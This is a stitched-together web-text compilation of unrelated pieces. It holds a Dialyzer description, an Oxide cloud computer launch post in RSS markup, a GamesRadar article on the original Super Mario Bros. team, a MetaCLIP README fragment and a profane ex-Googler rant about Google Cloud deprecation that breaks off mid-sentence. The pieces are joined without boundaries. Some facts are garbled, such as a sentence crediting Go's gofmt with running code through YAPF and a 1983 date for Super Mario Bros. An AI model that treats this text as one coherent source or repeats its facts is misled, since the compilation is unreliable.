Dialyzer starts its analysis from either debug-compiled BEAM bytecode  or from Erlang source code. The file and line number of a discrepancy  is reported along with an indication of what the discrepancy is about.  Dialyzer bases its analysis on the concept of success typings,  which allows for sound warnings (no false positives).</p>

This concept is similar to the Go programming language's 'gofmt' tool, which aims to put an end to debates about formatting by having the entire codebase of a project pass through YAPF whenever changes are made, thereby maintaining a consistent style throughout the project and eliminating the need to argue about style in every code review.</p>

            <description><![CDATA[<p>URL: <a href="https://oxide.computer/blog/the-cloud-computer">https://oxide.computer/blog/the-cloud-computer</a>, See on <a href="https://news.ycombinator.com/item?id=38023891">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><div id="preamble"><p>Today we are announcing the general availability of the world’s first
commercial cloud computer — along with
<a href="https://oxide.computer/blog/oxide-unveils-the-worlds-first-commercial-cloud-computer">our $44M Series A financing</a>.</p><p>From the outset at Oxide, and as I outlined in
<a href="https://www.youtube.com/watch?v=vvZA9n3e5pc">my 2020 Stanford talk</a>,
we have had three core beliefs as a company:</p><div><ol><li><p>Cloud computing is the future of all computing infrastructure.</p></li><li><p>The computer that runs the cloud should be able to be <strong>purchased</strong> and not
merely rented.</p></li><li><p>Building a cloud computer necessitates a rack-level approach — and the
co-design of both hardware and software.</p></li></ol></div><p>Of these beliefs, the first is not at all controversial: the agility,
flexibility, and scalability of cloud computing have been indisputably
essential for many of the services that we depend on in the modern economy.</p><p>The degree that the second belief is controversial, however, depends on who you
are:  for those that are already running on premises due to security,
regulatory, economic, or latency reasons, it is self-evident that computers
should be able to be purchased and not merely rented.  But to others, this has
been more of a revelation — and since we started Oxide, we have found more and
more people realize that the rental-only model for the cloud is not
sustainable.  Friends love to tag us on links to
<a href="https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox/">VC thinkpieces</a>,
<a href="https://world.hey.com/dhh/why-we-re-leaving-the-cloud-654b47e0">CTO rants</a>, or
<a href="https://www.idc.com/getdoc.jsp?containerId=IDC_P20184">analyst reports on
industry trends</a> — and we love people thinking of us, of course (even when
being tagged for the dozenth time!) — but the only surprise is how surprising
it continues to be for some folks.</p><p>The third belief — that the development of a cloud computer necessitates
rack-scale design of both hardware <em>and</em> software — may seem iconoclastic to
those who think only in terms of software, but it is in fact not controversial
among technologists: as computing pioneer Alan Kay famously observed, "people
who are really serious about software should make their own hardware." This is
especially true in cloud computing, where the large public cloud companies
have long ago come to the conclusion that they needed to be designing their
own holistic systems.  But if this isn’t controversial, why hasn’t there been
a cloud computer before Oxide’s?  First, because <strong>it’s big</strong>:  to meaningfully
build a cloud computer, one must break out of the shackles of the 1U or 2U
server, and really think about the rack as the unit of design.  Second,
it hasn’t been done because <strong>it’s hard</strong>:  co-designing hardware and
software that spans compute, networking, and storage requires building an
extraordinary team across disparate disciplines, coupling deep expertise with
a strong sense of versatility, teamwork, and empathy.  And the team isn’t
enough by itself: it also needs courage, resilience, and (especially) time.</p><p>So the biggest question when we set out was not "is the market there?" or "is
this the right way to do it?", but rather <strong>could we pull this off?</strong></p></div><div><h2 data-sectnum="">Pulling it off</h2><div><p>We have indeed
<a href="https://oxide.computer/product/specifications">pulled it off</a> — and it’s been a
wild ride!  While we have talked about the trek quite a bit on our podcast,
<a href="https://oxide.computer/podcasts/oxide-and-friends">Oxide and Friends</a> (and
specifically, <a href="https://oxide.computer/podcasts/oxide-and-friends/1411249">Steve
and I recently answered questions about the rack</a>), our general availability
is a good opportunity to reflect on some of the first impressions that the
Oxide cloud computer has made upon those who have seen it.</p><div><h3 data-sectnum="..">"Where are all the boxes?"</h3><div><p>The traditional rack-and-stack approach starts with a sea of boxes arriving
with servers, racks, cabling, etc.  This amounts to a literal
<a href="https://en.wikipedia.org/wiki/Kit_car">kit car</a> approach — and it starts with
tedious, dusty, de-boxing.  But the Oxide rack ships with everything installed
and comes in just <strong>one</strong> box — a crate that is
<a href="https://oxide.computer/podcasts/oxide-and-friends/1417751">its own feat of
engineering</a>.  All of this serves to dramatically reduce the latency from
equipment arrival to power on and first provision — from weeks and months to
days or even hours.</p></div></div><div><h3 data-sectnum="..">"Is it on?"</h3><div><p>We knew at the outset that rack-level design would afford us the ability to
change the geometry of compute sleds — that we would get higher density in the
rack by trading horizontal real estate for vertical.  We knew, too, that we
were choosing to use 80mm fans for their ability to move more air much more
efficiently — so much so that we leveraged
<a href="https://oxide.computer/blog/navigating-todays-supply-chain-challenges">our
approach to the supply chain</a> to partner with Sanyo Denki (our fan provider) to
lower the minimum speed of the fans from 5K RPM to the 2K RPM that we needed.
But adding it up, the Oxide rack has a surprising aesthetic attribute:  <strong>it is
whisper quiet.</strong>  To those accustomed to screaming servers, this is so
unexpected that when we were
<a href="https://oxide.computer/podcasts/oxide-and-friends/1200412">getting FCC
compliance</a>, the engineer running the test sheepishly asked us if we were sure
the rack was on — when it was dissipating 15 kW!  That the rack is quiet wasn’t
really deliberate (and we are frankly much more interested in the often hidden
power draw that blaring fan noise represents), but it does viscerally embody
much of the Oxide differentiation with respect to both rack-level design and
approach to the supply chain.</p></div></div><div><h3 data-sectnum="..">"Where are the cables?"</h3><div><p>Anyone accustomed to a datacenter will note the missing mass of cold-aisle
cabling that one typically sees at the front of a rack.  But moving to the back
of the rack reveals only a <a href="https://en.wikipedia.org/wiki/Busbar">DC busbar</a> and
a tight, cabled backplane.  This represents one of the bigger bets we made:
<a href="https://oxide.computer/podcasts/oxide-and-friends/1281318">we blindmated
networking</a>.  This was mechanically tricky, but the payoff is huge: capacity
can be added to the Oxide cloud computer simply by snapping in a new compute
sled — nothing to be cabled whatsoever!  This is a domain in which we have
leapfrogged the hyperscalers, who (for their own legacy reasons) don’t do it
this way.  This can be jarring to veteran technologists.  As one exclaimed upon
seeing the rack last week, "I am both surprised and delighted!" (Or rather:
a very profane variant of that sentiment.)</p></div></div><div><h3 data-sectnum="..">"You did your own switch too?!"</h3><div><p>When we first started the company, one of our biggest technical quandaries was
what to do about the switch.  At some level, both paths seemed untenable:  we
knew from our own experience that integrating with third-party switches would
lead to exactly the kind of integration pain for customers that we sought to
alleviate — but it also seemed outrageously ambitious to do our own switch in
addition to everything else we were doing.  But as we have many times over the
course of Oxide, we opted for the steeper path in the name of saving our
customers grief, choosing to
<a href="https://oxide.computer/podcasts/oxide-and-friends/838572">build our own
switch</a>.  If it has to be said,
<a href="https://oxide.computer/podcasts/oxide-and-friends/1008496">getting it working
isn’t easy</a>!  And of course, building the switch is insufficient: we also
needed to <a href="https://oxide.computer/podcasts/oxide-and-friends/1231631">build our
own networking software</a> — to say nothing of the
<a href="https://oxide.computer/podcasts/oxide-and-friends/1333581">management network</a>
required to be able to manage compute sleds when they’re powered off.</p></div></div><div><h3 data-sectnum="..">"Wait, <em>that’s</em> part of it?!"</h3><div><p>It’s one thing to say that all of the software that one needs to operate the
cloud computer is built in — but it’s another to actually see what that
software includes.  And for many, it’s seeing the
<a href="https://github.com/oxidecomputer/console">Oxide web console</a> (or its
<a href="https://oxide-console-preview.vercel.app/">live demo</a>!) that really drives the
message home:  yes, <strong>all</strong> of the software is included.  And because the
<a href="https://oxide.computer/podcasts/oxide-and-friends/1426644">console
implementation</a> is built on the <a href="https://docs.oxide.computer/">public API</a>,
everything that one can do in the console for the Oxide rack is also available
via CLI and API — a concrete manifestation of our
<a href="https://www.youtube.com/watch?v=EmSjZbSzA3A">code-as-contract</a> approach.</p></div></div><div><h3 data-sectnum="..">"And there’s no separate licensing?"</h3><div><p>One common source of pain for users of on-prem infrastructure has been license
management: financial pain due to over-paying and under-utilizing, and
operational pain in the navigation of different license terms, different
expiration dates, unpredictable dependencies, and
<a href="https://www.theregister.com/2022/05/31/vmware_broadcom_acquisition_customer_reaction/">uncertain
vendor futures</a>.  From the beginning we knew that we wanted to deliver a
delightful, integrated experience:  we believe that cloud computers should come
complete with all system software built-in, and with no additional licensing to
manage or to pay for.  Bug fixes and new features are always only an update
away and do not require a multi-departmental discussion to determine value and
budget.</p></div></div><div><h3 data-sectnum="..">"It’s all open source?"</h3><div><p>While the software is an essential part of the Oxide cloud computer, what we
sell is in fact the computer.  As <a href="https://www.youtube.com/watch?v=um5bC20NTQ0">a
champion of open source</a>, this allows Oxide a particularly straightforward open
source strategy:  <a href="https://github.com/oxidecomputer/">our software is all open</a>.
So you don’t need to worry about hinky open core models or relicensing
surprises.  And from a user perspective, you are assured levels of transparency
that you don’t get in the public cloud — let alone the proprietary on-prem
world.</p></div></div></div></div><div><h2 data-sectnum="">Getting your own first impression</h2><div><p>We’re really excited to have the first commercial cloud computer — and for
it to be generally available!  If you yourself are interested, we look
forward to it making its first impression on you —
<a href="https://oxide.computer/sales">reach out to us</a>!</p></div></div></div></div>]]></description>

<p>The original <a href="https://www.gamesradar.com/uk/tag/super-mario/" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.gamesradar.com/uk/tag/super-mario/">Super Mario</a> Bros. on NES was made by a team of five people, and it seems every single one of them is still at Nintendo and was credited on <a href="https://www.gamesradar.com/super-mario-bros-wonder-guide/" data-before-rewrite-localise="https://www.gamesradar.com/super-mario-bros-wonder-guide/">Super Mario Bros. Wonder</a>.</p><p>Back in the NES days, video games were small enough to be developed by absolutely tiny teams. Super Mario Bros., released in Japan in 1983, was made by just five people: director Shigeru Miyamoto, assistant director Takashi Tezuka, programmers Toshihiko Nakago and Kazuaki Morita, and musician Koji Kondo.</p><p>In an incredible feat of game industry continuity, all five of them are still credited on Super Mario Bros. Wonder. Miyamoto served as supervisor, with Tezuka as producer, Nakago as a special level design advisor, and Kondo as sound director. Morita, meanwhile, is in the special thanks section. With four of the five original devs serving in major supervisory roles 38 years later, this might just be the most incredible piece of developer continuity in gaming history.</p><div><blockquote data-lang="en"><p lang="en" dir="ltr">Oh, and even though they've been doing it for nearly 40 years, sounds like that's not stopping them from adapting to the times: pic.twitter.com/3WTDQkw7WJ<a href="https://twitter.com/maxnichols/status/1716316684506837256" data-url="https://twitter.com/maxnichols/status/1716316684506837256">October 23, 2023</a></p></blockquote><p><span role="button" tabindex="0" aria-label="See more">See more</span></p></div><p>"The people who are making Mario have been doing it in an unbroken streak since most of the creative leadership at other companies today were kids," as <a href="https://www.gamesradar.com/uk/tag/bungie/" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.gamesradar.com/uk/tag/bungie/">Bungie</a>'s Max Nichols notes on <a href="https://twitter.com/maxnichols/status/1716315414345678986" target="_blank" data-url="https://twitter.com/maxnichols/status/1716315414345678986">Twitter</a>. Nichols' tweets put this bit of trivia on my radar, and since then the full Wonder credits have been published on <a href="https://www.mobygames.com/game/210462/super-mario-bros-wonder/credits/switch/" target="_blank" data-url="https://www.mobygames.com/game/210462/super-mario-bros-wonder/credits/switch/">MobyGames</a>, confirming the full roles of all five of those original devs.</p><p>Of course, Wonder was made by a much larger team than just those original developers, including some less familiar names in key roles. Most notable is director Shiro Mouri, who despite being at Nintendo for over 25 years, only recently graduated to lead a full, original game of his own. He'd previously served as programming director on New Super Mario Bros. U and main director on the Switch port of that same game.</p><p>The game industry is notoriously volatile, and even among Japanese studios it's extremely uncommon to see legendary game designers continue to work on the series they made famous after this many years. As you can see in our <a href="https://www.gamesradar.com/super-mario-bros-wonder-review/" data-before-rewrite-localise="https://www.gamesradar.com/super-mario-bros-wonder-review/">Super Mario Bros. Wonder review</a>, it seems those old names haven't lost their touch, either.</p><p><em>There's a reason the </em><a href="https://www.gamesradar.com/best-mario-games/" data-before-rewrite-localise="https://www.gamesradar.com/best-mario-games/"><em>best Mario games</em></a><em> have stood the test of time better than most of their contemporaries.</em></p>

<p dir="auto">This repository contains the code for the MetaCLIP, described in the paper <a href="https://arxiv.org/abs/2309.16671" rel="nofollow">Demystifying CLIP Data</a> that formalizes CLIP data curation as a simple algorithm. The main contributions are:</p>
<ul dir="auto">
<li>Curating data from scratch without filtering via prior models (e.g., different from existing open source <a href="https://arxiv.org/abs/2111.02114" rel="nofollow">efforts</a> that uses the original CLIP model as a teacher for filtering <strong>student</strong> data.</li>
<li>Making training data more transparent, we released our <strong>training data distribution</strong> over <a href="https://github.com/facebookresearch/MetaCLIP/blob/main/metadata.json">metadata</a>;</li>
<li>A scalable algorithm running in the data pipeline, allowing to scale the <strong>data pool</strong> to the whole CommonCrawl (CC) w/ 300+B image-text pairs. We observe that data quality is <strong>much more</strong> important than quantity (different from existing <a href="https://arxiv.org/abs/2210.08402" rel="nofollow">open source efforts</a> or <a href="https://arxiv.org/abs/2102.05918" rel="nofollow">ALIGN</a> that mostly scale quantity);</li>
<li><a href="https://github.com/facebookresearch/MetaCLIP/blob/main/run_configs_400m.py">standard CLIP training setup</a> for controlled experiments and fair comparisons under fixed training and model configuration.</li>
</ul>
<p dir="auto">We conclude that:</p>
<ul dir="auto">
<li>Effective pretraining data should <strong>maximally preserve signal and mitigate noise</strong>, instead of hard removal of noise with blackbox filters that lead to unknown distribution</li>
<li>Our algorithm is simpler and scalable to curate the whole Internet</li>
<li>Open-sourcing does not just entail a trained model checkpoint but more importantly the <strong>pre-training data distribution</strong>.</li>

<h2 tabindex="-1" id="user-content-metadata" dir="auto"><a href="#metadata">Metadata</a></h2>
<p dir="auto">MetaCLIP uses 500,000 queries as <a href="https://github.com/facebookresearch/MetaCLIP/blob/main/metadata.json">metadata</a> to align the training data to distribution over quality writing of Wikipedia/WordNet terms.

<h3 tabindex="-1" id="user-content-pre-trained-models" dir="auto"><a href="#pre-trained-models">Pre-trained Models</a></h3>
<p dir="auto">We change OpenCLIP to match training in the default CLIP model setup (w/ <a href="https://github.com/facebookresearch/MetaCLIP/blob/main/src/open_clip/model_configs/ViT-B-16-quickgelu.json">ViT-B-16-quickgelu</a>, <a href="https://github.com/facebookresearch/MetaCLIP/blob/main/src/open_clip/model_configs/ViT-L-14-quickgelu.json">ViT-L-14-quickgelu</a> and <a href="https://github.com/facebookresearch/MetaCLIP/blob/main/src/open_clip/model_configs/ViT-H-14-quickgelu.json">ViT-H-14-quickgelu</a>).

I have so much stuff to do. Blogging takes time and energy and creativity that I could be putting to good use: my novels, my <a href="https://www.youtube.com/watch?v=VK244wAQ3Qo" rel="noopener ugc nofollow" target="_blank">music</a>, my game, and so on. But you get me riled enough, and I have to blog.</p><p id="983a">Let’s get this over with, then.</p><p id="b6e0">I’ll begin with a small but enlightening story from my early days at Google. For the record, I know I’ve said some perhaps unkind things about Google lately, because it’s frustrating when your corporate alma mater makes incompetent business decisions on the regular. But Google’s internal infrastructure is truly extraordinary, and you could argue that there is still none better today. The people who built Google were far better engineers than I will <em>ever</em> be, as this anecdote should serve to illustrate.</p><p id="2586">First a wee bit of background: Google has a storage technology called <a href="https://en.wikipedia.org/wiki/Bigtable" rel="noopener ugc nofollow" target="_blank">Bigtable</a>. Bigtable was a remarkable technical achievement, being one of the first (if not <em>the</em> first) “infinitely scalable” key-value stores: the beginning of NoSQL, basically. These days Bigtable still holds up well in the rather crowded space of K/V stores, but back in the day (2005) it was breathtakingly cool.</p><p id="2f06">One fun bit of trivia about Bigtable is that they had these internal control-plane entities (as part of the implementation) called tablet servers, which had large indexes, and at some point they became a scaling bottleneck. So the Bigtable engineers scratched their heads over how to make it scale, and realized that they could replace the tablet servers with Bigtables to unblock the scaling. So Bigtable is part of its own implementation. It’s Bigtables all the way down.</p><p id="0205">Another cool bit of trivia is that for a time, Bigtables became popular and ubiquitous inside Google and everyone and their dog had one. So at one Friday’s TGIF all-hands, Larry Page casually asked in passing, “Why do we have more than one Bigtable? Why isn’t there just one?” Because in theory, one Bigtable should have sufficed for all Google’s storage needs. Of course they never did migrate to just one, for practical software engineering reasons (e.g. blast radius), but the theory was interesting. One database for the whole universe. <em>(Side note: Anyone know if Sable does this at Amazon?)</em></p><p id="04cd">Anyway, here’s my story, to get us started on my rant.</p><p id="fceb">One day, after I’d been working at Google for just over 2 years, I got an email from the Bigtable engineering team. It said something along the lines of:</p><p id="d48c"><em>Dear Steve,</em></p><p id="0bf7"><em>Greetings from the Bigtable team. We wanted to let you know that you are running a very, very old Bigtable binary in the [some data center name] data center. That version is no longer supported, and we would like to work with you to help you upgrade to the latest version.</em></p><p id="02a5"><em>Please let us know if you can schedule some time to work with us on this.</em></p><p id="0770"><em>Best,</em></p><p id="b3af"><em>Bigtable Team</em></p><p id="4a24">You get a lot of email at Google, as you can imagine, and when I glanced at this one, this is what I first perceived it to be saying:</p><p id="03d2"><em>Dear </em><strong><em>RECIPIENT</em></strong><em>,</em></p><p id="f81e"><em>Greetings from Some Team. We wanted to let you know blah blah blah blah blah blah blah. Blah blah blah blah blah blah blah BLAH, and blah blah blah blah immediately.</em></p><p id="ead9"><em>Please let us know if you can schedule some of your precious time to blah blah blah.</em></p><p id="702a"><em>Best,</em></p><p id="7355"><em>Some Team</em></p><p id="5b9c">I almost deleted it on the spot, but there was this lingering, nagging feeling that it didn’t <em>quite</em> feel like a form letter, even though it <em>obviously</em> wasn’t for me, since I didn’t have a Bigtable.</p><p id="e46e">But it was weird.</p><p id="d293">For the rest of the day, as I was alternating between working and deciding which species of gummy shark to try next in the micro-kitchens, of which there were at least three close enough to hit from my seat with a well-aimed biscuit, I thought about that email with a growing sense of mild anxiety.</p><p id="9431">They had used my name specifically. And the email had been sent to my email address and nobody else’s, and not by cc: or bcc:. The tone was very personal and pointed. Maybe it was some sort of mistake?</p><p id="19bc">Curiosity finally got the better of me, and I went to look at my Borg console in the data center they’d mentioned in the email.</p><p id="8645">And sure enough, I was running a Bigtable there. Whaaaaat? I looked at its contents, and lo! It was from the Bigtable codelab I’d run back in my first week as a Noogler, in June 2005. The codelab had you fire up a Bigtable so you could programmatically write some values to it, and I had apparently never shut it down afterwards. It was still running there, over 2 years later.</p><p id="9f7b">There are several remarkable aspects to this story. One is that running a Bigtable was so inconsequential to Google’s scale that it took 2 years before anyone even noticed it, and even then, only because the version was old. As a point of comparison, I considered using <a href="https://cloud.google.com/bigtable" rel="noopener ugc nofollow" target="_blank">Google Cloud Bigtable</a> for my online game, but it cost (at the time) an estimated $16,000/year for an <em>empty</em> Bigtable on GCP. I’m not saying they’re gouging you, but in my own personal opinion, that feels like a lot of money for an empty fucking database.</p><p id="b925">Another remarkable aspect is that <em>it was still running after 2 years</em>. WTF? Data centers come and go; they experience outages, they undergo routine maintenance, they change all the time. Hardware gets upgraded, network switches swap out, everything is constantly being improved. How the heck were they able to keep my software running for 2 years in the face of all that change? It may feel like a humdrum achievement in 2020, but in 2005–2007 it was pretty impressive.</p><p id="73e4">And then there is in my opinion the most remarkable aspect of all, which is that an unrelated engineering team in some other state was reaching out to <em>me</em>, the owner of some tiny mostly-empty Bigtable instance which had had <em>zero traffic</em> for the past 2 years, asking if they could help me upgrade.</p><p id="d0bb">I thanked them and shut it down and life went on. But I still think about that letter, thirteen years later. Because I sometimes get similar letters from the Google Cloud Platform. They look like this:</p><p id="c068"><em>Dear Google Cloud Platform User,</em></p><p id="ec5e"><em>We are writing to remind you that we are sunsetting [Important Service you are using] as of August 2020, after which you will not be able to perform any updates or upgrades on your instances. We encourage you to upgrade to the latest version, which is in Beta, has no documentation, no migration path, and which we have kindly deprecated in advance for you</em>.</p><p id="9bff"><em>We are committed to ensuring that all developers of Google Cloud Platform are minimally disrupted by this change.</em></p><p id="1d71"><em>Besties Forever,</em></p><p id="b8c9"><em>Google Cloud Platform</em></p><p id="191d">But I barely skim them, because what they are really saying is:</p><p id="9035"><em>Dear </em><strong><em>RECIPIENT</em></strong><em>,</em></p><p id="63a8"><em>Fuck yooooouuuuuuuu. Fuck you, fuck you, Fuck You. Drop whatever you are doing because it’s not important. What is important is OUR time. It’s costing us time and money to support our shit, and we’re tired of it, so we’re not going to support it anymore. So drop your fucking plans and go start digging through our shitty documentation, begging for scraps on forums, and oh by the way, our new shit is COMPLETELY different from the old shit, because well, we fucked that design up pretty bad, heh, but hey, that’s YOUR problem, not our problem.</em></p><p id="6aa7"><em>We remain committed as always to ensuring everything you write will be unusable within 1 year.</em></p><p id="7d39"><em>Please go fuck yourself,</em></p><p id="589b"><em>Google Cloud Platform</em></p><p id="f3b8">And the thing is, I get these about once a month. It happens so often and so reliably that I have been inexorably pushed <em>away</em> from GCP, towards cloud agnosticism. I no longer take dependencies on their proprietary service offerings, because it actually winds up being less DevOps work, on average, to support open-source systems running on bare VMs, than to try to keep up with Google’s deprecation treadmill.</p><p id="77c1">Before I return to shitting on Google Cloud Platform, because boyo I am nowhere <em>near</em> finished yet, let’s go visit how software engineering works in some other domains. Google engineers pride themselves on their software engineering discipline, and that’s actually what gets them into trouble. Pride is a trap for the unwary, and it has ensnared many a Google team into thinking that their decisions are always right, and that correctness (by some vague fuzzy definition) is more important than customer focus.</p><p id="1b8c">I’m going to pick a few somewhat arbitrary examples from other big software systems, but hopefully you’ll be able to start spotting the pattern everywhere; that pattern being: <strong>Backwards compatibility keeps systems alive and relevant for decades</strong>.</p><p id="c284">Backwards compatibility is a design goal of all successful systems that are designed for <em>open</em> use; that is, implemented as open source, and/or guided by open standards. I feel like I’m stating something that’s so obvious that we should all be awkwardly embarrassed, but no. It’s a political issue, so I need examples.</p><p id="94db">The first system I’ll pick is the oldest: GNU Emacs, which is a sort of hybrid between Windows Notepad, a monolithic-kernel operating system, and the International Space Station. It’s a bit tricky to explain, but in a nutshell, Emacs is a platform written in 1976 (yes, almost half a century ago) for writing software to make you more productive, masquerading as a text editor.</p><p id="6e9d">I use Emacs every single day. Yes, I’m also using IntelliJ every day, and that has grown into a powerful tooling platform in its own right. But writing software extensions for IntelliJ is a much more ambitious and complex undertaking than writing extensions for Emacs. And more importantly, stuff lasts <em>forever</em> on Emacs.</p><p id="673f">I’m still using software that I wrote for Emacs back in 1995. And I’m sure there are people who are still using software they wrote for Emacs from the mid-80s, if not earlier. Every once in a while it might require a minor tweak, but it’s really quite rare. I’m not aware of anything I’ve ever written for Emacs (and I’ve written a lot) that was ever forced into re-architecture.</p><p id="cf77">Emacs does have a deprecation facility called make-obsolete. Emacs’ terminology for fundamental software engineering concepts (like what is a “window”) are often different from the industry conventions, because Emacs invented them long, long ago. The perils of being before your time: Your names are all wrong. But Emacs does indeed have deprecation, called <em>obsolescence</em> in their lingo.</p><p id="2bec">However, the Emacs folks seem to have a different working definition. A different underlying philosophy, if you will.</p><p id="f6c6">In the Emacs world (and in many other domains, some of which we’ll explore below), when they make an API obsolete, they are basically saying: “You really shouldn’t use this approach, because even though it works, it suffers from various deficiencies which we enumerate here. But in the end it’s your call.”</p><p id="cf46">Whereas in the Google world, deprecation means: “We are breaking our commitments to you.” It really does. That’s what it ultimately means. It means they are going to force you to do some work, possibly a large amount of rework, <em>on a regular basis</em>, as punishment for doing what they told you to do originally — as punishment for listening to their glossy marketing on their <a href="https://cloud.google.com/gcp" rel="noopener ugc nofollow" target="_blank">website</a>: Better software. Faster! You do <em>everything</em> they tell you to do, and you launch your application or service, and then, bang, a year or two later it breaks down.</p><p id="9f63">This is like selling you a used car that they know is going to break down in under 1000 miles.</p><p id="4411">These are two very, very different philosophical definitions of “deprecation”. Google’s definition reeks of <a href="https://en.wikipedia.org/wiki/Planned_obsolescence" rel="noopener ugc nofollow" target="_blank">planned obsolescence</a>. I don’t believe that it’s <em>actually</em> planned obsolescence in the same sense that, say, Apple perpetrates. But Google definitely plans to break your stuff, in a roundabout way. I know because I worked there as a software engineer for 12+ years. They have loose internal guidelines about how much backwards compatibility to bake into service offerings, but in the end it’s up to each individual team or service. There are no corporate-level or engineering-level guidelines, and the <em>longest</em> anyone has the courage to recommend, in terms of deprecation cycles, is “try to give your customers 6–12 months to upgrade before you drape them over the barrel.”</p><p id="de52">This is hurting them far more than they realize, and it will continue to hurt them for years to come, because it’s not part of their DNA to care about customers. More on this below.</p><p id="6928">For the moment, I’m going to make the bold assertion that Emacs is successful in large part, perhaps even <em>mostly</em>, because they take backwards compatibility so seriously. In fact, that’s the thesis of this essay. Successful long-lived open systems owe their success to building decades-long micro-communities around <em>extensions/plugins</em>, also known as a <em>marketplace</em>. I’ve ranted about Platforms before, and how important they are, and how Google has never once in their entire corporate history ever really understood what goes into making a successful open Platform, not counting Android or Chrome.</p><p id="33e4">Actually I should talk about Android briefly, because you’re probably thinking, hey, what about Android?</p><p id="c8f6">First, <em>Android is not Google</em>. They have almost nothing to do with each other. Android is a company that was purchased by Google in July 2005, and that company has been allowed to run more or less autonomously, and in fact has remained largely intact through the intervening years. Android is an infamously hairy tech stack, and a just-as-infamously prickly organization. As one Googler put it, “One does not simply walk into Android.”</p><p id="17a1">I’ve done my share of ranting about how bad some of Android’s early design decisions have been. Heck, at the time I was doing that ranting, they were busy rolling out shit like Instant Apps, which is now (surprise!) <a href="https://android-developers.googleblog.com/2019/04/google-play-instant-feature-plugin.html#:~:text=When%20building%20your%20app%2C%20you,bundle%20as%20soon%20as%20possible." rel="noopener ugc nofollow" target="_blank">deprecated</a>, and haha on you if you were dumb enough to listen to them when they told you to port all your stuff to Instant Apps.</p><p id="f23b">But there’s a difference here, a material difference, which is that the Android folks actually DO understand how important Platforms are, they go <em>well out of their way</em> to prevent breaking your old Android code. In fact, their efforts to keep backward compatibility are so extreme that even I, during my brief stint in Android-land a few years back, found myself trying to convince them to drop support for some of the oldest devices and APIs. (I was wrong, as I’ve been about many other things past and present. Sorry Android folks! Now that I’ve visited Indonesia, I see why we need them.)</p><p id="377f">The Android folks take backwards compatibility to almost unimaginable extremes, which piles on massive amounts of legacy technical debt in their systems and toolchains. Oh boy, you should see some of the crazy stuff they have to do in their build system, all in the name of compatibility.</p><p id="bde0">For this, I award Android the coveted You’re Not Google award. You really don’t want to be Google. They don’t know how to build platforms that can last, whereas Android <em>does</em> know how to do it. And so Google is being very wise in one respect: letting the Android folks do things their way.</p><p id="3ec4">Instant Apps was a pretty dumb idea, though. You know why? Because it required you to <em>rewrite and re-architect your application!</em> As if people are just going to up and rewrite 2 million apps. I’m guessing Instant Apps was probably a Googler’s idea.</p><p id="cef2">But you see the difference here. Backwards compatibility comes with a steep cost, and Android has chosen to bear the burden of that cost, whereas Google insists that <em>you</em>, the paying customer, bear that burden.</p><p id="4d09">You can see Android’s commitment to backwards compatibility in their APIs. It’s a sure sign, when there are four or five different coexisting subsystems for doing literally the same thing, that underlying it all is a commitment to backwards compatibility. Which in the Platforms world, is synonymous with commitment to your customers, and to your marketplace.</p><p id="50ec">Google’s pride in their software engineering hygiene is what gets them into trouble here. They don’t like it when there are lots of different ways to do the same thing, with older, less-desirable ways sitting alongside newer fancier ways. It increases the learning curve for newcomers to the system, it increases the burden of supporting the legacy APIs, it slows down new feature velocity, and the worst sin of all: it’s ugly. Google is like Lady Ascot in Tim Burton’s Alice in Wonderland:</p><p id="f219"><strong>Lady Ascot</strong>: Alice, do you know what I fear most?</p><p id="8b14"><strong>Alice Kingsley</strong>: The decline of the aristocracy?</p><p id="87b2"><strong>Lady Ascot</strong>: <em>Ugly grandchildren</em>.</p><p id="e941">To explore the tradeoff of Pretty vs Practical, let’s take a peek at a third successful platform (after Emacs and Android) and see how it fares: Java itself.</p><p id="0fbb">Java has <em>tons</em> of deprecated APIs. Deprecation is super popular with Java programmers, more so than for most programming languages. Java itself, the core language and libraries, deprecates APIs all the time.</p><p id="f717">To take just one of thousands of examples, <a href="https://docs.oracle.com/en/java/javase/12/docs/api/java.base/java/lang/Thread.html#stop()" rel="noopener ugc nofollow" target="_blank">killing threads</a> is deprecated. It’s been deprecated since Java 1.2, released in December 1998. It’s been 22 years since they deprecated it.</p><p id="2b55">My live production code still kills threads <em>every day</em>. Is that a good thing? Absolutely! I mean, obviously if I were to rewrite the code today I’d do it differently. But my game code, which has been able to make hundreds of thousands of people happy over the past 2 decades, was written to kill worker threads that take too long, and <em>I’ve never had to change it.</em> I know my system best, and I have literally 25 years of experience with running it in production, and I can tell you: In my use case, killing these particular worker threads is <em>harmless</em>. It is not worth it to focus my time and energy on rewriting that code, and praise be unto Larry Ellison (I guess), since Oracle has never made me rewrite it.</p><p id="dd33">I guess Oracle understands Platforms too. Go figure.</p><p id="06d9">You can see evidence all through Java’s core APIs of waves of deprecation, like glacier lines in a canyon. There are easily five or six different keyboard focus managers in Java Swing. In fact it’s hard to find a Java API that isn’t deprecated. But they all still work! I think the only time the Java core team will actually <em>remove</em> an API is if it causes a blatant security problem.</p><p id="d186">Here’s the thing, folks: We software developers are all super busy, and we are also faced with competing alternatives in <em>every</em> software domain. At any given time, programmers in language X are looking at language Y as a possible replacement. Oh, you don’t believe me? What about Swift? Everyone’s migrating *to* Swift, not away from it, right? Oho, how little you know. Businesses are taking a mercenary’s accounting of their dual mobile teams (iOS and Android), and starting to realize that those phony-sounding dog-and-pony-show cross-platform development systems like Flutter and React Native have real teeth, and using them could cut their mobile team sizes in half, or alternately, make them twice as productive. There’s real money at stake here. Yes, there are trade-offs, but on the other hand, mooooooooney.</p><p id="12dc">Let’s say hypothetically that Apple was dumb enough to pull a Guido van Rossum, and declare that Swift 6.0 is backwards-incompatible with Swift 5.0, much in the way that Python 3 is incompatible with Python 2.</p><p id="5064">I probably told this story ten years ago, but about fifteen years ago I was at O’Reilly’s Foo Camp with Guido, sitting in a tent with Paul Graham and a bunch of other at-the-time mucky-mucks, waiting for Larry Page to fly out in his personal helicopter, and Guido was droning on tonelessly in the sweltering heat about “Python 3000”, which he had named in honor of the number of years it would take everyone to migrate to it. We kept asking him why he was breaking compatibility, and he’d answer, “Unicode”. And we’d ask him, hey, if we have to rewrite our code, then what other benefits are we going to see? And he’d answer, “Yoooooooooooooouuuuuuuniiiiiiicoooooooode”.</p><p id="a1d3">If you install the Google Cloud Platform “gcloud” SDK, you’ll get this notice:</p><p id="3fdb"><em>Dear RECIPIENT,</em></p><p id="ec71"><em>We would like to remind you that support for Python 2 is deprecated, so fuuuuuuck 